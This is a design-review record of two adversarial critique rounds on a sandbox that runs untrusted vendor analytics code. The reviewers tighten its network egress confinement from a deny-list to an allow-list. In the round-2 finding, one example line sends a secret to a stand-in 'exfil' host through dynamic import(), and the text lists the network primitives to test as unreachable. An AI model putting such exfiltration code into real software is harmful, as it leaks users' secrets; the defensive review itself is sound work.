---
slice: 012-01 — wrapped-SDK host + alloy boots + one Analytics event
pass: frame-critique
verdict: pass
reviewer: general-purpose (2 rounds)
reviewed_at: 2026-08-29T21:23:21Z
prompt_source: review.py frame-critique
---

**Verdict: pass** — concluded on owner authority (2026-08-29) after **two** adversarial
frame-critique rounds (independent general-purpose reviewers), each of which corrected a
real over-claim. The frame-critique evidence gate is a deliberateness signal a human can
clear (ADR-0020); the owner chose to conclude on the resulting frame rather than spin a
third round, because round 2's fix was **structural** (it closes the category the reviews
were probing, not just the instance).

## Round 1 — one blocking + three tightens; two premises upheld

- **[BLOCKING] Security surface under-stated.** "Parity with MVP1 / mediated egress" was a
  *false* safety argument: MVP1's worker has **no** network primitive (GA4 returns an
  `EgressRequest`; the worker never fetches — dispatch is main-thread, `core/airlock.js`),
  so "no seal" is *structurally* safe. MVP2's chamber hosts **untrusted vendor code** with
  a live shimmed `fetch`, making the interception shim the sole egress chokepoint — but the
  slice enumerated no confinement of the *other* ambient network primitives. **Fixed:** new
  Assumption discloses the live-network chamber as a new attack surface, drops "parity with
  MVP1" as a safety claim, and a new AC requires egress confinement tested both ways.
- **[tighten] additive = signatures, not egress-model** — the wrapped-SDK adds a
  request/**response** round-trip the fire-and-forget `EgressRequest` doesn't model. Fixed
  (AC6 + Assumption).
- **[tighten] stub scope** — Goal qualified to "end-to-end against a local minting stub;
  live-Edge acceptance credentials-gated/deferred." Fixed.
- **[tighten] B-vs-C is a precondition, not a pass/fail AC** — moved to DoR; the ADR is a
  DoD ratify record. Fixed.
- **Upheld as strengths:** slice-1 thickness is genuinely *thick-but-vertical* (every split
  yields a horizontal layer or an anti-value slice shipping unmediated egress); interception
  is *grounded* (R-004 already intercepted alloy's `fetch` in a worker), not assumed.

## Round 2 — round-1 items all verified addressed; one narrow structural gap

- **[BLOCKING, narrow] AC5's deny-list can't be complete.** The enumerated deny-list
  omitted `WebTransport` and `CacheStorage`, and — load-bearing — **dynamic `import()`** is
  a *language-level* loader primitive a JS shim cannot withhold (untrusted code could
  `import("https://exfil/?d="+secret)`), which AC2's then-lead module-worker route exposed.
  Same failure *category* as round 1 (an unenumerated primitive defeating a completeness
  claim), finer-grained. **Fixed structurally:** AC5 reframed from a **deny-list** to an
  **allow-list posture** — the mediated `fetch` is the chamber's *only* network-capable
  surface; the test asserts a representative adversarial set (now incl. `WebTransport`,
  `CacheStorage`, remote `import()`) is unreachable. AC2 commits to the **classic-worker
  `importScripts` load route** (R-004's proven route, revoked post-load — no
  module-`import()` dependency); the language-level `import()` residual is **disclosed** and
  gated to MVP3 seal enforcement + an optional worker `connect-src` CSP.
- Round-2 explicitly re-verified round-1 items 1a/2/3/4 as **addressed**.

## Why conclude here

The round-2 fix flips the frame from "enumerate every bad primitive" (never provably
complete) to "only `fetch` is allowed; a representative adversarial set is tested
unreachable; the one non-withholdable primitive is disclosed and gated." That is a
*closeable* claim — it addresses the root cause both rounds were probing, so a third round
would test finer instances of an already-structurally-sound frame. Recorded pass on that
basis.

Recorded by: author on owner authority ("go", 2026-08-29), after two independent
frame-critique rounds.
